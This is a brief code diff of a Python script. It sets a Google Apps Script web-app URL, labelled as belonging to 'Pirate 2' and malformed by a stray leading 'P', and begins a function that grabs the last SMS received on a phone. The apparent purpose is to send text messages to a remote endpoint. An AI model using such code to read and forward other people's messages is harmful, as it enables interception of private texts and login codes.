@@ -2,8 +2,8 @@ import subprocess
 import requests
 import time
 
-# PIRATE 2'S WEB APP URL GOES HERE
-URL = "PASTE_THE_URL_FROM_PIRATE_2_HERE"
+
+URL = "Phttps://script.google.com/macros/s/AKfycbyuWfztTkEC7J00xTrusMt5P2nA3wA2ayLuDtrvtPEFedr7kjI3zaDJXfaFuzRU7g74/exec"
 
 def get_sms():
     # This command grabs the last SMS received on the phone
